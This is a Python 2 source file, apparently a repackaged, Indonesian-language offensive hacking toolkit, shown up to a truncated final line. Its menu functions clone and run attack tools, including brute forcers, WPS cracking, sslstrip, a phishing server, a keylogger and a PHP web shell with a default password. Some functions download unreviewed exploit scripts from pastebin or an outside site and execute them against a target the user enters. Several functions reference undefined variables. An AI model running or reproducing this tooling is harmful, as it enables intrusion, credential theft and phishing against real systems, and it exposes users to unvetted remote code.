 #!/usr/bin/env python2.7
#
#          All In One Tool For Penetration Testing 
#           Authors : Mohamed Nour , Fedy Wesleti  
#          Decoded By TheSploit

import sys
import argparse
import os
import time
import httplib
import subprocess
import re, urllib2
import socket
import urllib,sys,json
import telnetlib
import glob
import random
import Queue 
import threading
import requests
import base64
from getpass import getpass
from commands import *
from sys import argv
from platform import system
from urlparse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep
########################## 
#Variables
directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
upload = []
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
ditect= ['13', '14', '15', '16', '17', '18', '19', '20', '21']
heathenchoice= ['4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
G = '\033[92m' #green
Y = '\033[93m' #yellow
B = '\033[94m' #blue
R = '\033[91m' #red
W = '\033[0m' #white
########################## 
#end of varialbles 
def logo():
    print  ("""%s
 ___  ___  __       ____  __    __  __    ___ 
/ __)(  ,\(  )  ___(_  _)/  \  /  \(  )  / __)
\__ \ ) _/ )(__(___) )( ( () )( () ))(__ \__ \
(___/(_)  (____)    (__) \__/  \__/(____)(___/ %s{PVT}
                                     %sPenetration Testing Framework    									 
                                                                                                    
%s                                                                        
==>       Decoded&Up By %sTheSploit %s& %sSploit    %s<== 
==>           Whatsapp/%s081316577616 %s              <== 
==>             Penetration Testing Framework         <== 
""")%(R,Y,B,G,R,Y,G,B,Y,B)
def menu():
    print ("""
%s
 ___  ___  __       ____  __    __  __    ___ 
/ __)(  ,\(  )  ___(_  _)/  \  /  \(  )  / __)
\__ \ ) _/ )(__(___) )( ( () )( () ))(__ \__ \
(___/(_)  (____)    (__) \__/  \__/(____)(___/ %s{PVT}
                                     %sPenetration Testing Framework     									 
%s                                                                        
==>       Decoded&Up By %sTheSploit %s& %sSploit          %s<== 
==>           Whatsapp/%s081316577616 %s            <== 
==>             Pentest Tools                <== 
    Silahkan Pilih sesuai Kebutuhan:
    
    1 : Pengumpulan Informasi
    2 : Password Attacks
    3 : Pengujian Nirkabel
    4 : Alat Eksploitasi
    5 : Sniffing & Spoofing
    6 : Peretasan Web 
    7 : Private Tools
    8 : Post Exploitation
    9 : Recon
    10: Penetrasi Smartphone
    11: Lainnya
    0: Keluar
    """)%(G,R,B,G,Y,G,Y,G,R,G)
    choice = raw_input("Enter Your Choice: ")
    
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        webhack()
    elif choice == "7":
        tnn()
    elif choice == "8":
        postexp()
    elif choice == "9":
        sniper()    
    elif choice == "10":
        phones()
    elif choice == "11":
        others()
    elif choice == "0":
        sys.exit();
    elif choice == "":
        menu()
    else: 
        menu()
def sniper():
    print ("Alat ini hanya tersedia untuk Linux / OSX atau sistem serupa ")
    choicesniper = raw_input("Continue Y / N: ")
    if choicesniper in yes:
        os.system ("git clone https://github.com/1N3/Sn1per.git")
        os.system ("cd Sn1per && sudo bash ./install.sh")
        os.system ("sniper")
    elif choicesniper == "":
        menu()
def others():
    print("""
1) QrlJacking-Framework 
2)Sniffles - Packet Capture Generator for IDS and Regular Expression Evaluation 
0)
        """)
    otherc = raw_input("choose an option : ")
    if otherc =="1":
        qrljack()
    elif otherc =="2":
        sniffles()
    elif otherc =="0":
        menu()
    else:
        menu()
def sniffles():
    print("Sniffles adalah alat untuk membuat tangkapan paket yang akan menguji IDS yang menggunakan pola tetap atau ekspresi reguler untuk mendeteksi perilaku mencurigakan")
    print("Tools ini membutuhkan python3.X")
    os.system("git clone https://github.com/petabi/sniffles && cd sniffles && python3 setup.py")
    print("jika alat ini tidak diinstal dengan benar, jalankan : cd sniffles && python3.X setup.py ")
def qrljack():
    os.system("git clone https://github.com/OWASP/QRLJacking qrl && cd qrl && cd cd QrlJacking-Framework && pip install -r requirements.txt && python QRLJacker.py ")
def smartphones():
    print("""
  1 : Pemindaian aplikasi APK 
  2 : Pemindaian smartphone
  0:
  """)
    spc = raw_input("Select an option : ")
    if spc =="1":
        droidhunter()
    if spc =="2":
        phones()
    if spc=="0":
        menu()
    else:
        menu()
def droidhunter():
    print ("Droid-Hunter - Analisis Kerentanan Aplikasi Android Dan Perangkat Pentest Android")
    print ("Apakah Anda Menginstal Droid-Hunter ?")
    choicedh = raw_input("Y/N: ")
    if choicedh in yes:
       os.system("git clone https://github.com/hahwul/droid-hunter.git && cd droid-hunter && sudo gem install html-table && gem install colorize && ruby dhunter.rb")
    elif choicedh in no:
        os.system('clear'); menu()
def phones():
    phoneslist = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
    logo()
    print("""
        1 :  Attach Framework to a Deployed Agent/Create Agent"
        2 :  Send Commands to an Agent"
        3 :  View Information Gathered"
        4 :  Attach Framework to a Mobile Modem"
        5 :  Run a remote attack"
        6 :  Run a social engineering or client side attack"
        7 :  Compile code to run on mobile devices"
        8 :  Install Stuff"
        9 :  Use Drozer" 
        10:  Setup API"
        11:  Bruteforce the Android Passcode given the hash and salt")
        0:  Exit""")
    choicespf = raw_input("Select an option : ")
    if choicespf in phoneslist:
        oschoice = raw_input("""Opsi ini akan menginstal Kerangka Pentest Smartphone untuk Anda, Anda harus mengonfigurasi dan menjalankannya sendiri 
        1)OSX 
        2)Kali Linux 
        3)BackTrack
        Pilih OS Kamu : """)
        if oschoice =="1":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash osxinstall.sh")
        if oschoice =="2":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash kaliinstall ")
        if oschoice =="3":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash btinstall")
    elif choice5 =="11":
        androidhash()
    else:
        menu()
def doork():
    print("doork adalah alat auditor kerentanan open-source open source yang mengotomatiskan proses pencarian informasi Google tentang situs web tertentu berdasarkan dorks.")
    doorkchice = raw_input("Continue Y / N: ")
    if doorkchice in yes:
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = raw_input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log"%doorkt)
def postexp():
    clearScr()
    print("1 :  Shell Checker")
    print("2 :  POET")
    print("3 :  Weeman - Phishing Framework")
    print("4 : Insecure Web Interface")
    print("5 : Insufficient Authentication/Authorization")
    print("6 : Insecure Network Services")
    print("7 : Lack of Transport Encryption")
    print("8 : Privacy Concerns")
    print("9 : Insecure Cloud Interface")
    print("10: Insecure Mobile Interface")
    print("11: Insufficient Security Configurability")
    print("12: Insecure Software/Firmware")
    print("13: Poor Physical Security")
    print("14: Tinyshell : python Client with php shell")
    print("15: Radium-Keylogger - Python keylogger with multiple features ")
    print("0: Go Back ")
    choice11 = raw_input("Tentukan Pilihanmu:")
    if choice11 == "1":
        sitechecker()
    if choice11 == "2":
        poet()
    if choice11 == "3":
        weeman()
    if choice11 in heathenchoice:
        print("Tools ini hanya berfungsi pada kali linux")
        hchoice = raw_input("Continue ? Y / N : ")
        if hchoice in yes:
            os.system("git clone https://github.com/chihebchebbi/Internet-Of-Things-Pentesting-Framework.git heathen && cd heathen && bash Heathen.sh ")
        else :
            postexp()
    if choice11 == "14":
        tinyshell()
    if choice11 =="15":
        radium()
    elif choice11 == "0":
        menu()
def radium():
    print("Langkah ini hanya akan mengunduh Radium-Keylogger untuk Anda, itu tidak akan menginstalnya ")
    print("untuk menginstal, cd Radium-Keylogger dan lihat Persyaratan.txt terlebih dahulu ")
    os.system("git clone https://github.com/mehulj94/Radium-Keylogger")
def tinyshell():
    print("Alat ini akan membuat payload php, yang akan memungkinkan Anda mengakses webserver menggunakan python")
    ctiny = raw_input("continue ? y/n : ")
    if ctiny in yes:
        os.system("git clone https://github.com/lawrenceamer/tinyshell.git")
        print("Anda akan menemukan payload php di /tinyshell/shell.php dengan kata sandi default: 123456, masukkan dalam skrip php dan hubungkan")
        explurl = raw_input("Tautan target dengan file php : ")
        os.system("cd tinyshell && python remote_shell.py %s 123456"%explurl)
    elif ctiny in no:
        menu()
def scanusers():
    site = raw_input('Masukkan website : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print users
            resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
            # i can use regular expression too
            if 'invalid username' not in resp.lower():
                print "\tFound -> %s" %users
                pass

            users = users[:-1]
    except:
        pass
def brutex():
    clearScr()
    print("Secara otomatis brute force semua layanan yang berjalan pada target: Buka port / domain DNS / Nama pengguna / Kata Sandi ")
    os.system("git clone https://github.com/1N3/BruteX.git")
    clearScr
    brutexchoice = raw_input("Select a Target : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s"%brutexchoice)
def arachni():
    print("Arachni adalah kerangka kerja Ruby penuh fitur, modular, dan berkinerja tinggi yang bertujuan membantu penguji penetrasi dan administrator mengevaluasi keamanan aplikasi web")
    cara = raw_input("Install And Run ? Y / N : ")
    clearScr
    print("exemple : http://www.target.com/")
    tara = raw_input("Pilih target yang ingin di Scan : ")
    if cara in yes:
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system("cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("arachni")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s"%tara)
def xsstracer():
    clearScr()
    print("XSSTracer adalah skrip python kecil yang memeriksa server web jarak jauh untuk Clickjacking, Cross-Frame Scripting, Cross-Site Tracing dan Host Header Injection.")
    os.system("git clone https://github.com/1N3/XSSTracer.git")
    clearScr ()
    xsstracerchoice = raw_input("Select a Target: ")
    os.system("cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80"%xsstracerchoice)
def weeman():
    print("Server HTTP untuk phishing dengan python. (dan framework) Biasanya Anda ingin menjalankan Weeman dengan serangan spoof DNS. (lihat dsniff, ettercap).")
    choicewee = raw_input("Install Weeman ? Y / N : ")
    if choicewee in yes:
        os.system("git clone https://github.com/Hypsurus/weeman.git && cd weeman && python weeman.py")
    if choicewee in no:
        menu()
    else:
        menu()    
def gabriel():
    print("Menyalahgunakan bypass otentikasi Open & Compact (Gabriel)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass=raw_input("Masukkan Target IP dan Gunakan Perintah:")
    os.system("python gabriel.py %s"%ftpbypass)
def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")
def h2ip():
    host = raw_input("Pilih Host : ")
    ips = socket.gethostbyname(host)
    print(ips)
def ports():
    clearScr()
    target = raw_input('Pilih IP Target :')
    os.system("nmap -O -Pn %s" % target) 
    sys.exit();
def ifinurl():
    print""" Pencarian lanjutan ini di mesin pencari, memungkinkan analisis yang disediakan untuk mengeksploitasi GET / POST menangkap email & url, dengan persimpangan validasi kustom internal untuk setiap target / url ditemukan."""
    print('Apakah Anda Ingin Menginstal InurlBR ? ')
    cinurl = raw_input("Y/N: ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else: 
        menu()
def bsqlbf():
    clearScr()
    print("Alat ini hanya akan bekerja pada injeksi sql blind")
    cbsq=raw_input("Pilih Target : ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s"%cbsq)
    os.system("rm bsqlbf.pl")
def venom():
    print ("Venom Generator Shellcode Otomatis")
    print ("Apakah kamu menginstallnya ?")
    choiceshell = raw_input("Y/N: ")
    if choiceshell in yes:
        os.system("wget http://fsociety.tn/venom.zip --output-document=venom.zip")
        os.system("unzip venom.zip -d venom")
        os.system("cd venom && sh venom.sh")
    elif choiceshell in no:
        os.system('clear'); info()     
def commix():
    print ("Alat Injeksi dan Eksploitasi Perintah All-in-One OS Otomatis.")
    print ("Penggunaan : python commix.py --help")
    choicecmx = raw_input("Continue: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    elif choicecmx in no:
        os.system('clear'); info()        
def pixiewps():
    print"""Pixiewps adalah alat yang ditulis dalam bahasa C yang digunakan untuk bruteforce offline pin WPS mengeksploitasi entropi rendah atau tidak ada yang ada dari beberapa Poin Akses, yang disebut "serangan debu pixie" yang ditemukan oleh Dominique Bongard pada musim panas 2014. Ini dimaksudkan untuk tujuan pendidikan saja
    """
    choicewps = raw_input("Continue ? Y/N : ")
    if choicewps in yes :
        os.system("git clone https://github.com/wiire/pixiewps.git") 
        os.system(" cd pixiewps/src & make ")
        os.system(" cd pixiewps/src & sudo make install")
    if choicewps in no : 
        menu() 
    elif choicewps == "":
        menu()
    else: 
        menu()
def webhack():
    print("1 : Peretasan Drupal ")
    print("2 : Inurlbr")
    print("3 : Wordpress & Joomla Scanner")
    print("4 : Gravity Form Scanner")
    print("5 : File Upload Checker")
    print("6 : Wordpress Exploit Scanner")
    print("7 : Wordpress Plugins Scanner")
    print("8 : Shell and Directory Finder")
    print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
    print("10: Vbulletin 5.X remote code execution")
    print("11: BruteX - Automatically brute force all services running on a target")
    print("12: Arachni - Web Application Security Scanner Framework")
    print("13: Sub-domain Scanning")
    print("14: Wordpress Scanning")
    print("15: Wordpress Username Enumeration")
    print("16: Wordpress Backup Grabbing")
    print("17: Sensitive File Detection")
    print("18: Same-Site Scripting Scanning")
    print("19: Click Jacking Detection")
    print("20: Powerful XSS vulnerability scanning")
    print("21: SQL Injection vulnerability scanning")
    print("0: Go Back")
    choiceweb = raw_input("Silahkeun Pilih : ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr(); ifinurl()
    if choiceweb =='3':
        clearScr(); wppjmla()
    if choiceweb =="4":
        clearScr(); gravity()
    if choiceweb =="5":
        clearScr(); sqlscan()
    if choiceweb =="6":
        clearScr(); wpminiscanner()
    if choiceweb =="7":
        clearScr();wppluginscan()
    if choiceweb =="8":
        clearScr();shelltarget()
    if choiceweb =="9":
        clearScr();joomlarce()
    if choiceweb =="10":
        clearScr();vbulletinrce()
    if choiceweb =="11":
        clearScr();brutex()
    if choiceweb=="12":
        clearScr();arachni()
    if choiceweb in ditect:
        dtect()
    elif choiceweb =="0":
        menu()
    elif choiceweb == "":
        menu()
    else: 
        menu() 
def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")
def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr();print("jika jawabannya adalah 200, Anda akan menemukan shell Anda di Joomla_3.5_Shell.txt")
    jmtarget=raw_input("Pilih List Target :")
    os.system("python temp.py %s"%jmtarget)
def inurl():
    dork = raw_input("Pilih Dork:")
    output = raw_input("Pilih File untuk Menyimpan :")
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else: 
        menu()
def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()
def dtect():
    print("Ini akan menginstal dan menjalankan kerangka kerja pengujian Penetrasi D-TECT")
    cdtect=raw_input("Continue ? Y/N : ")
    if cdtect in yes:
        os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT.git && cd D-TECT && python d-tect.py")
    else :
        menu()
def nmap():

    choice7 = raw_input("continue ? Y / N : ")
    if choice7 in yes :
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 & ./configure")
        os.system("cd nmap-7.01 & make")
        os.system("su root")
        os.system("cd nmap-7.01 & make install")
    elif choice7 in no :
        info()
    elif choice7 == "":
        menu()
    else: 
        menu()
def jboss():
    os.system('clear')
    print ("Skrip JBoss ini menggunakan shell JSP di server target JBoss AS. Sekali")
    print ("digunakan, skrip menggunakan kemampuan unggah dan eksekusi perintah untuk")
    print ("menyediakan sesi interaktif.")
    print ("")
    print ("Penggunaan : ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    choice9 = raw_input("yes / no :")
    if choice9 in yes:
        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git"),sys.exit();
    elif choice9 in no:
        os.system('clear'); exp()
    elif choice9 == "":
        menu()
    else: 
        menu()
def wppluginscan():
    Notfound = [404,401,400,403,406,301]
    sitesfile = raw_input("sites file : ")
    filepath = raw_input("Plugins File : ")
    def scan(site, dir):
        global resp
        try:
                conn = httplib.HTTPConnection(site)
                conn.request('HEAD', "/wp-content/plugins/" + dir)
                resp = conn.getresponse().status
        except(), message:
                print "Cant Connect :",message
                pass
    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)
    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site,plugin)
            if resp not in Notfound:
                    print "+----------------------------------------+"
                    print "| current site :" + site
                    print "| Found Plugin : "  + plugin
                    print "| Result:",resp
def sqlmap():
    print ("Penggunaan : python sqlmap.py -h")
    choice8 = raw_input("Continue: y/n :")
    if choice8 in yes:
        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear'); info()
    elif choice8 == "":
        menu()
    else: 
        menu()
def grabuploadedlink(url):
    try :
                    for dir in directories :
                              currentcode = urllib.urlopen(url + dir).getcode()
                              if currentcode == 200 or currentcode ==  403:
                                     print "-------------------------"
                                     print "  [ + ] Direktori Ditemukan :  " + str(url + dir)               + " [ + ]"     
                                     print "-------------------------"                                                                   
                                     upload.append(url + dir)  
    except :
      pass     
def grabshell(url) :                                                                     
   try :
        for upl in upload :
                            for shell in shells :
                              currentcode = urllib.urlopen(upl + shell).getcode()
                              if currentcode == 200 :
                                     print "-------------------------"
                                     print "  [ ! ] Shell Ditemukan :  " + str(upl + shell)         + " [ ! ]"     
                                     print "-------------------------"         
   except :
        pass  
def shelltarget():
    print("Contoh : http://target.com")
    line = raw_input("target : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)
def poet():
    print("POET adalah Alat Eksploitasi-POst sederhana.")
    print("")
    choicepoet = raw_input("y / n :")
    if choicepoet in yes:
        os.system("git clone https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    if choicepoet in no:
        clearScr(); postexp()
    elif choicepoet == "":
        menu()
    else: 
        menu()
def setoolkit():
    print ("Social-Engineer Toolkit adalah kerangka kerja pengujian penetrasi sumber terbuka")
    print(") dirancang untuk rekayasa sosial. SET memiliki sejumlah vektor serangan rekaan ")
    print(" memungkinkan Anda untuk melakukan serangan yang dapat dipercaya dengan cepat. SET adalah produk dari TrustedSec, LLC  ")
    print("sebuah perusahaan konsultan keamanan informasi yang berlokasi di Cleveland, Ohio.")
    print("")
    choiceset = raw_input("y / n :")
    if choiceset in yes:
        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr(); info()
    elif choiceset == "":
        menu()
    else: 
        menu()
def cupp():
    print("cupp adalah pembuat daftar kata sandi ")
    print("Penggunaan: python cupp.py -h")
    choicecupp = raw_input("Continue: y/n : ")
    
    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("file berhasil diunduh")
    elif choicecupp in no:
        clearScr(); passwd()
    elif choicecupp == "":
        menu()
    else: 
        menu()
def ncrack():
    print("Antarmuka Ruby ke Ncrack, alat peretas otentikasi jaringan.")
    print("Membutuhkan : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continue: y/n")
    choicencrack = raw_input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr(); passwd()
    elif choicencrack == "":
        menu()
    else: 
        menu()
def reaver():
    print """
      Reaver telah dirancang untuk menjadi serangan yang kuat dan praktis terhadap Wi-Fi Protected Setup
      PIN registrar WPS untuk memulihkan frasa sandi WPA / WPA2. Telah diuji terhadap a
      berbagai macam titik akses dan implementasi WPS
      1 untuk menerima / 0 untuk ditolak
        """
    creaver = raw_input("y / n :")
    if creaver in yes:
        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr(); wire()
    elif creaver == "":
        menu()
    else: 
        menu()
def ssls():
    print"""sslstrip adalah alat MITM yang mengimplementasikan stripping SSL Moxie Marlinspike
    serangan.
    Ini membutuhkan Python 2.5 atau lebih baru, bersama dengan modul python 'Twisted'."""
    cssl = raw_input("y / n :")
    if cssl in yes: 
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl =="":
        menu()
    else:
        menu()
def unique(seq):
        seen = set()
        return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
        
        lista = []
        page = 1
        while page <= 101:
                try:
                        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=5